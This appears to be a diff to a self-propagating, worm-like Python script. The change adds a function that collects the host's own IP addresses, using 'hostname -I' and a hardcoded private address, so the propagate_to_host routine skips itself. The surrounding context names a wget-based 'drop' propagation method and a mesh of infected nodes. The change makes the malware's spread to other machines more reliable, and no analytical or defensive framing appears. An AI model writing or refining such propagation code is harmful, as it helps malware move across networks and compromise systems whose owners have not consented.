@@ -279,14 +279,30 @@ def propagate_via_wget_drop(ip, port=80):
         pass
     return False
 
+def get_own_ips():
+    """All IPs belonging to this node"""
+    own = {'127.0.0.1', 'localhost', '::1'}
+    try:
+        own.add(socket.gethostbyname(socket.gethostname()))
+    except: pass
+    own.add(get_my_ip())
+    try:
+        import subprocess as _sp
+        out = _sp.run(['hostname', '-I'], capture_output=True, text=True).stdout
+        for ip in out.strip().split():
+            own.add(ip.strip())
+    except: pass
+    own.add('172.28.137.134')
+    return own
+
 def propagate_to_host(ip, open_ports):
     """Try all propagation methods for a host, return first success"""
-    my_ip = get_my_ip()
-    
-    if ip == my_ip or ip == '127.0.0.1':
-        return False  # don't propagate to self
+    own = get_own_ips()
+
+    if ip in own:
+        return False  # never propagate to self
     if ip in MESH_NODES and MESH_NODES[ip].get('alive'):
-        return False  # already propagated
+        return False  # already propagated and alive
     
     log(f"Attempting propagation to {ip} (ports: {open_ports})", "PROPAGATE")
     
